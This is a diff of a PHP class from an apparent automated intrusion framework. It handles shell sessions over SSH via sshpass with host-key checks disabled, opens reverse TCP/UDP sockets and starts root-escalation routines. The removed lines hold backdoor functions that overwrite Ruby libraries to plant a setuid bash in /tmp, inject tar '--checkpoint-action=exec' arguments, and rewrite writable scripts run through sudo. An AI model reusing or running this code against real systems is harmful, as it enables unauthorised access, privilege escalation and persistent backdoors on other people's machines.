@@ -17,8 +17,8 @@ class STREAM4COM extends SERVICE4COM {
         $login = trim($login);
         $mdp = trim($mdp);
         
-        $template_cmd = "sshpass -p '$mdp' ssh $login@$host -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%CMD%\" ";
-        $this->cmd("Create Stream  SSH",$template_cmd);
+        $template_shell = "sshpass -p '$mdp' ssh $login@$host -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%SHELL%\" ";
+        $this->cmd("Create Stream  SSH",$template_shell);
         
         $con = ssh2_connect( $host, $port);
         
@@ -44,7 +44,7 @@ class STREAM4COM extends SERVICE4COM {
                 if (is_resource($stream)){
                     $this->note("Success Established Connexion");
                     $this->yesAUTH($this->port2id, $login, $mdp,"","", "", "", "",__FUNCTION__);
-                    $this->port2shell(base64_encode($template_cmd));
+                    $this->port2shell(base64_encode($template_shell));
                     return $stream ;
                 }
                 else {
@@ -95,7 +95,7 @@ class STREAM4COM extends SERVICE4COM {
     }
     
     
-    public function stream4check($stream,$template_cmd,$username,$userpass){
+    public function stream4check($stream,$template_shell,$username,$userpass){
         $this->ssTitre(__FUNCTION__);
         $check = "";
         $shell_found = "";
@@ -112,8 +112,8 @@ class STREAM4COM extends SERVICE4COM {
             if ($this->stream8shell2check($stream)) {
                 $this->note("Normal Shell");
                 $template_id = "%ID%";
-                $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
-                return array($stream,$template_id,$template_cmd,$template_shell) ;
+                
+                return array($stream,$template_id,$template_shell) ;
             }
             else {
                 
@@ -127,10 +127,9 @@ class STREAM4COM extends SERVICE4COM {
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 $id8b64 = base64_encode($id);
                 if (!empty($uid_name)){
-                    $cmd = "%CMD%";
                     $template_id = str_replace("/usr/bin/id","%ID%",$data);
-                    $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
-                    return array($stream,$template_id,$template_cmd,$template_shell) ;
+                    
+                    return array($stream,$template_id,$template_shell) ;
                     
                 }
                 $this->pause();
@@ -144,10 +143,9 @@ class STREAM4COM extends SERVICE4COM {
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 $id8b64 = base64_encode($id);
                 if (!empty($uid_name)){
-                    $cmd = "%CMD%";
                     $template_id = str_replace("id","%ID%",$data);
-                    $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
-                    return array($stream,$template_id,$template_cmd,$template_shell) ;
+                    $template_shell = str_replace("%ID%", "%SHELL%", $template_id);
+                    return array($stream,$template_id,$template_shell) ;
                     
                 }
                 $this->pause();
@@ -180,11 +178,10 @@ class STREAM4COM extends SERVICE4COM {
                 $rst_id = stream_get_contents($stream);
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
-                    $cmd = "%CMD%";
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
-                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
-                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
-                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+
+                    $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
+                    return array($stream,$template_id_new,$template_shell_new) ;
                     
                 }
                 $this->pause();
@@ -308,11 +305,9 @@ class STREAM4COM extends SERVICE4COM {
                 $rst_id = stream_get_contents($stream);
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
-                    $cmd = "%CMD%";
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
-                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
-                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
-                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                    $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
+                    return array($stream,$template_id_new,$template_shell_new) ;
                     
                 }
                 $this->pause();
@@ -477,14 +472,14 @@ class STREAM4COM extends SERVICE4COM {
                             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                             if (!empty($uid_name)){
                                 
-                                $cmd = "%CMD%";
+                              
                                 $data_id = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
                                 
                                 $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
-                                $template_cmd_new = str_replace("%CMD%", $data_id, $template_cmd);
-                                $template_shell_new = str_replace("%CMD%", " $data_id; $template_id_new", $template_cmd);
-                                $template_shell_new = str_replace("%CMD%","%SHELL%", $template_shell_new);
-                                return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                                
+                                $template_shell_new = str_replace("%SHELL%", " $data_id; $template_id_new", $template_shell);
+                                $template_shell_new = str_replace("%ID%","%SHELL%", $template_shell_new);
+                                return array($stream,$template_id_new,$template_shell_new) ;
                                 
                             }
                         }
@@ -514,8 +509,8 @@ class STREAM4COM extends SERVICE4COM {
         $lport = trim($lport);
         $time2wait = (int)$time2wait;
         
-        if ($this->protocol=='T') $socket = stream_socket_client("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
-        if ($this->protocol=='U') $socket = stream_socket_client("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
+        if ($this->protocol=='T') $socket = stream_socket_client("tcp://$this->ip:$lport", $errno, $errstr);
+        if ($this->protocol=='U') $socket = stream_socket_client("udp://$this->ip:$lport", $errno, $errstr);
         
         if (!$socket) {
             echo "$errstr ($errno)\n";
@@ -543,7 +538,7 @@ class STREAM4COM extends SERVICE4COM {
                 case "windows" :
                 case "Windows" :
                     $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$info);
-                    $result .=  $obj_lan->lan4pentest();
+                    $result .=  $obj_lan->root4pentest();
                     break ;
                     
                 case "Linux" :
@@ -569,7 +564,7 @@ class STREAM4COM extends SERVICE4COM {
     
     
     
-    public function  stream8server($lport,$lprotocol,$templateB64_cmd,$templateB64_shell,$whois,$time2wait){
+    public function  stream8server($lport,$lprotocol,$templateB64_id,$templateB64_shell,$whois,$time2wait){
         $this->titre(__FUNCTION__);
         $result = "";
         // http://php.net/manual/fr/function.socket-import-stream.php
@@ -577,7 +572,7 @@ class STREAM4COM extends SERVICE4COM {
         $lport = trim($lport);
         $lprotocol = trim($lprotocol);
         $time2wait = (int)$time2wait;
-        $template_cmd = base64_decode($templateB64_cmd);
+        $template_id = base64_decode($templateB64_id);
         
         if ($lprotocol=='T') $socket8server = stream_socket_server("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
         if ($lprotocol=='U') $socket8server = stream_socket_server("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr, STREAM_SERVER_BIND);
@@ -590,7 +585,7 @@ class STREAM4COM extends SERVICE4COM {
         } else {
             $this->article("Server Listenning on Port", $lport);
             $this->article("Protocol", $lprotocol);
-            $this->article("Template CMD",$template_cmd );
+            $this->article("Template ID",$template_id );
             $this->article("Whois", $whois);
             $this->article("Global TimeOut", $time2wait);
             
@@ -618,7 +613,7 @@ class STREAM4COM extends SERVICE4COM {
                 case "windows" :
                 case "Windows" :
                     $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id);
-                    $result .=  $obj_lan->lan4pentest();
+                    $result .=  $obj_lan->root4pentest();
                     break ;
                     
                 case "Linux" :
@@ -627,29 +622,22 @@ class STREAM4COM extends SERVICE4COM {
                 case "unix" :
                 case "cisco" :
                 default:
-                    $template_id = "%ID%";
-                    $templateB64_id = base64_encode($template_id);
+
                     $id = str_replace("%ID%", "id", $template_id);
-                    
-                    
-                    $template_cmd = base64_decode($templateB64_cmd);
                     $rst = $this->req_str($stream, $id, 10," | grep 'uid=' ");
                     list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst);
                     $id8b64 = base64_encode($id8str);
                     $this->article("CREATE Template ID", $template_id);
-                    //$this->article("CREATE Template BASE64 ID", $templateB64_id);
-                    $this->article("CREATE Template CMD", $template_cmd);
-                    //$this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
                     $template_shell = base64_decode($templateB64_shell);
-                    $this->article("Template SHELL", $template_shell);
+                    $this->article("CREATE Template SHELL", $template_shell);
                     
                     
                     
-                    $obj_lan = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
+                    $obj_lan = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_shell,$id8b64);
                     var_dump($this->flag_poc);
                     $obj_lan->poc($this->flag_poc);
                     var_dump($obj_lan->flag_poc);
-                    $obj_lan->lan4root();
+                    $obj_lan->lan2root();
                     break ;
             }
             fclose($stream);
@@ -660,106 +648,7 @@ class STREAM4COM extends SERVICE4COM {
         return $result;
     }
     
-    
-    public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
-        $this->ssTitre(__FUNCTION__);
-        $login = trim($login);
-        
-        $query = "file $private_key_file";
-        $check_pem = trim($this->req_ret_str($query));
-        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
-            $this->log2succes("Convert PEM for libssh - PHP");
-            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
-        }
-        $query = "head -5 $private_key_file";
-        $priv_keys = trim($this->req_ret_str($query));
-        if (empty($priv_keys)) return $this->log2error("Empty Private Key");
-        $query = "head -5 $public_key_file";
-        $pub_keys = trim($this->req_ret_str($query));
-        if (empty($pub_keys)) return $this->log2error("Empty Public Key");
-        $cmd = "id";
-        $this->requette("chmod 600 $private_key_file");
-        $this->requette("head -5 $private_key_file");
-        $query = "ssh -i $private_key_file $login@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
-        $this->cmd("localhost",$query);
-        
-        
-        $con = @ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
-        if($con===FALSE) {
-            $chaine = "Failed Connection";
-            $this->log2error($chaine);
-            return FALSE ;
-        }
-        $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
-        $this->note($infos);
-        
-        
-        $this->requette("ls -al $public_key_file");
-        $this->requette("file $public_key_file");
-        $this->requette("head -5 $public_key_file");
-        
-        $this->requette("ls -al $private_key_file");
-        $this->requette("file $private_key_file");
-        $this->requette("head -5 $private_key_file");
-        if (@ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
-            
-            $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
-            $this->log2succes("Identification réussie en utilisant une clé publique");
-            $this->port2shell(base64_encode($infos));
-            $this->pause();
-            return $con ;
-        } else {
-            $chaine = "Failed Public Key Authentication";
-            $this->log2error($chaine);
-            return FALSE ;
-        }
-        
-        // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
-        // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
-        
-    }
-    
-    
-    public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
-        $this->ssTitre(__FUNCTION__);
-        $this->str2file($private_key_str, $private_key_file);
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
-        }
-        return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
-        
-    }
-    public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str,$private_key_file,$private_key_passwd){
-        $this->ssTitre(__FUNCTION__);
-        $this->str2file($private_key_str, $private_key_file);
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $private_key_passwd);
-            $this->key2gen4public("",10, $private_key_file, $public_key_file,$private_key_passwd);
-        }
-        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
-    }
-    
-    public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
-        /*
-         https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
-         */
-        $this->ssTitre(__FUNCTION__);
-        
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        
-        
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
-        }
-        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
-    }
-    
-    
+
     
     
     public function env2path2info($stream){
@@ -1045,18 +934,18 @@ This can also be used to determine local IPs, as well as gain a better understan
         
         $data = "which $filename ";
         $files_found = "";
-        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout,"$this->filter_file_path | grep '$filename' "));
+        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
         if( !empty($files_found)) return $files_found ;
         
         $data = "locate $filename ";
         $files_found = "";
-        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout,"$this->filter_file_path | grep '$filename' "));
+        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
         if( !empty($files_found)) return $files_found ;
         
 
         $data = "find / -iname $filename -type f -exec ls {} \;";
         $files_found = "";
-        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout,"$this->filter_file_path | grep '$filename' "));
+        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
         if( !empty($files_found)) return $files_found ;
     }
     
@@ -1080,153 +969,7 @@ This can also be used to determine local IPs, as well as gain a better understan
         $this->article("Searching", "Not Found");
         return FALSE;
     }
-    
-    public function backdoor($stream,$lan_filepath){
-        $obj_exec = new FILE($lan_filepath);
-        
-        $data = "file $obj_exec->file_path";
-        $file_info = $this->req_str($stream,$data,$this->stream_timeout,"");
-        // if ($this->file4writable($obj_jobs->file_path)){
-        
-        if ( $this->file4exist8path($stream,$lan_filepath) ){
-            switch ($file_info) {
-                // Bourne-Again shell script, ASCII text executable
-                case (strstr($file_info,"Bourne-Again shell script, ASCII text executable")!==FALSE) :
-                    $this->backdoor4ascii4bash($stream,$lan_filepath);
-                    
-                    break;
-                    
-                    
-                case (strstr($file_info,"Ruby script, ASCII text executable")!==FALSE) :
-                    $this->backdoor4ruby($stream,$lan_filepath);
-                    break;
-                    
-                    
-                case (strstr($file_info,"tar, ")!==FALSE) :
-                    $this->backdoor4ascii4tar($stream,$lan_filepath);
-                    break;
-                    
-                case (strstr($file_info,"ASCII text")!==FALSE) :
-                    $this->backdoor4ascii4bash($stream,$lan_filepath);
-                    break;
-                    
-                default:
-                    break;
-            }
-        }
-    }
-    
-    public function backdoor4ruby($stream,$lan_filepath){
-        $result = "";
-        $this->ssTitre(__FUNCTION__);
-        $obj_jobs = new FILE($lan_filepath);
-        $data = "cat $obj_jobs->file_path | grep -i require ";
-        $libs = $this->req_tab($stream,$data,$this->stream_timeout," | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\"");
 
-        
-        //$libs = array("zip");
-        
-        foreach ($libs as $lib){
-            $lib = trim($lib);
-            if (!empty($lib)){
-                $hashname = sha1($lib);
-                
-                $data = "gem which $lib  | grep '/'";
-                $lib_path = $this->req_str($stream,$data,$this->stream_timeout,"| grep '/' | grep -Po \"^/[[:print:]]{1,}\"");
-
-                
-                $this->article("LIB", $lib);
-                $this->article("LIB PATH", $lib_path);
-                //var_dump($tmp);fgets(STDIN);
-                $this->pause();
-                
-                $data = "ls -al $lib_path";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "chmod 777 $lib_path";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "ls -al $lib_path";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "ls -al /tmp/";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "echo '`cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname`' > $lib_path";
-                //$data = "echo '$(cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname)' > $lib_path";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                if (strstr($minute, "*")) $seconds = "60";
-                else $seconds = $minute;
-                $this->article("Wait Seconds", $seconds);
-                
-                sleep($seconds);
-                $this->pause();
-                
-                $data = "ls -al /tmp/";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "ls -al /tmp/$hashname";
-                $this->req_str($stream,$data,$this->stream_timeout,"");
-                $data = "/tmp/$hashname -p -c id";
-                $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
-                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
-                
-                $this->pause();
-                if (strstr($rst_id, "euid=")) {
-                    $template_id = "/tmp/$hashname -p -c %ID%";
-                    $templateB64_id = base64_encode($template_id);
-                    $template_id_new = $this->spawn2shell8euid($template_id,$euid_name);
-                    
-                    
-                    $this->pentest8id($stream,$template_id_new);
-                    
-                }
-                
-                
-                
-            }
-        }
-    }
-    
-    public function backdoor4ascii4tar($stream,$lan_filepath){
-        $result = "";
-        $this->ssTitre(__FUNCTION__);
-        $lan_filepath = trim($lan_filepath);
-        $obj_jobs = new FILE($lan_filepath);
-        
-        $data = "file $obj_jobs->file_path";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-        // if ($this->file4writable($obj_jobs->file_path)){
-        $filter = " | strings | grep \"tar\" | grep -Po \"tar \"";
-        $check_tar = $this->req_str($stream,"cat $obj_jobs->file_path $filter ",$this->stream_timeout,$filter);
-        
-        if (!empty($check_tar)){
-            $sha1_hash = sha1($obj_jobs->file_path);
-            $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
-            
-            $this->pentest8id($stream,$template_id_test);
-            $this->pause();
-        }
-    }
-    
-    public function backdoor4ascii4bash($stream,$lan_filepath){
-        $this->ssTitre(__FUNCTION__);
-        $lan_filepath = trim($lan_filepath);
-        $obj_jobs = new FILE($lan_filepath);
-        
-        $data = "file $obj_jobs->file_path";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-        
-        $this->req_str($stream,"cat $obj_jobs->file_path",$this->stream_timeout,"");
-        
-        $tab_users_shell = $this->ip2users4shell();
-        foreach ($tab_users_shell as $username){
-            //sleep($minute*60);
-            if (!$this->ip2root8db($this->ip2id)){
-                $template_id_test = "echo '%ID%' > $obj_jobs->file_path && sudo -u $username $obj_jobs->file_path";
-                
-                $this->pentest8id($stream,$template_id_test);
-                $this->pause();
-            }
-        }
-    }
-
-    
     public function file4add($stream,$filename,$add_data){
         $this->ssTitre(__FUNCTION__);
         $obj_filename = new FILE($filename);
